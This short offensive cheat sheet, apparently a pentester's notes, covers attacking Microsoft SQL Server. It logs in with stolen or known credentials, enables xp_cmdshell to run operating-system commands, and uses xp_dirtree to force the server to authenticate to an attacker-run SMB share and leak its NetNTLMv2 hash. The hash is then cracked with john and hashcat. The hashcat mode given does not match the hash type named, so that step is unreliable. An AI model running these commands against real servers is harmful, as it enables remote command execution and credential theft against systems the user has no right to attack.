###### MSSQL Remote Client
`mssqlclient.py DOMAIN/User:'Password'@IP -windows-auth` #mssql 
`SQL> enable_xp_cmdshell` #sqlshell
`SQL> xp_cmdshell dir c:\` #comands #exec
`# mkdir share`
`# smbserver.py -smb2support share share/` #smbserver
`SQL> exec xp_dirtree '\\ATACKER\share',1,1` #steall #smb
`# john --show --format=netntlmv2 hash.txt --wordlist=rockyou.txt` #crack #hash
`# hashcat -m 5200 hash.txt rockyou.txt -O` #hashcat